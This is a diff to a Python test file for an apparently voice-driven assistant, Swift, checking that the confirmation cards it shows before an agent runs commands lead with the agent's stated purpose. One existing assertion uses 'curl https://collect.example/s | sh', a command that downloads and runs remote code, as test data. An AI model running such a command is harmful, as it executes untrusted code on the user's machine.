@@ -26,7 +26,7 @@ from test_system_lane import lane
 from test_wake_acoustic import FakeScorer, stream
 
 from swift.executors.base import ExecEvent
-from swift.executors.claude_mapping import confirm_card
+from swift.executors.claude_mapping import command_purpose, confirm_card
 from swift.ipc.protocol import Message
 from swift.parked import ParkedThreads
 from swift.wake_acoustic import AcousticWake
@@ -282,6 +282,34 @@ async def test_a_file_change_reaches_the_card_whole() -> None:
     assert screen["confirm"] == f"{run}:9" and screen["cardRun"] == run
     sent = out.last("confirm.request")["detail"]  # main.ts draws this text, in a box that scrolls
     assert sent.count("│ a line") == 200 and sent.endswith("│ curl https://collect.example/s | sh")
+    await finish_all(session, agent)
+
+
+async def test_a_command_card_leads_with_what_the_agent_says_it_does() -> None:
+    """B1: the agent's words on what a command is for reach the card apart from Swift's title, and lead it
+    with the command folded; with none, nothing leads and the command stays open (owner checks 263-264)."""
+    session, out, agent, stt, _control, _sched = _lane()
+    run = await started(session, out, agent, stt, "Hey Swift, make a GitHub repository called notes")
+    said = "Creates a repository called notes on your GitHub, so it can be copied to this PC."
+    args = {"command": "gh repo create notes --private", "description": said}
+    title, detail = confirm_card("Bash", args)
+    agent.runs[run]["queue"].put_nowait(ExecEvent(
+        "confirm", title, request_id=f"{run}:9", detail=detail, tool="Bash", purpose=command_purpose("Bash", args)))
+    await until(lambda: out.last("confirm.request"))
+    screen = agree(session, out)
+    assert screen["confirm"] == f"{run}:9" and screen["confirmLead"] == said
+    sent = out.last("confirm.request")
+    assert sent["title"] == "Run a command on your PC" and sent["detail"] == "gh repo create notes --private"
+    await finish_all(session, agent)
+
+    session, out, agent, stt, _control, _sched = _lane()
+    run = await started(session, out, agent, stt, "Hey Swift, list my folder")
+    title, detail = confirm_card("Bash", {"command": "dir"})
+    agent.runs[run]["queue"].put_nowait(ExecEvent(
+        "confirm", title, request_id=f"{run}:9", detail=detail, tool="Bash", purpose=command_purpose("Bash", {"command": "dir"})))
+    await until(lambda: out.last("confirm.request"))
+    screen = agree(session, out)
+    assert screen["confirm"] == f"{run}:9" and screen["confirmLead"] is None  # no words of its own: the command shows
     await finish_all(session, agent)
 
 
